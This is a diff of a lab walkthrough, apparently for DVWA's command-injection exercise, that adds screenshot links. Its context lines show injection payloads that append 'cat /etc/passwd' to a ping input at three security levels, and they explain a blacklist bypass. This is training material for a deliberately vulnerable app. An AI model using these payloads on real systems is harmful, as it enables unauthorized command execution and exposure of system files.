@@ -27,6 +27,8 @@ rtt min/avg/max/mdev = 50.401/70.910/93.461/16.016 ms
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+![Guide image](./screenshots/1.png)
+
 We can see that we are `www-data` since this is the role that host the website. Try payload `1.1.1.1; cat /etc/passwd`. This should be the same `/etc/passwd` content on your computer.
 
 ## MEDIUM Security Level
@@ -50,6 +52,8 @@ This blacklist will prevent us from using the payload in LOW security level. How
 | cat /etc/passwd
 ```
 It should show the same result as LOW security level.
+
+![Guide image](./screenshots/1.png)
 
 ## HIGH Security Level
 This is the new blacklist
@@ -77,6 +81,8 @@ It just blacklist the `'| '` so `'|'` will not be prevented. We can leverage the
 
 1.1.1.1|cat /etc/passwd
 ```
+
+![Guide image](./screenshots/1.png)
 
 ## Resources
 - https://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution
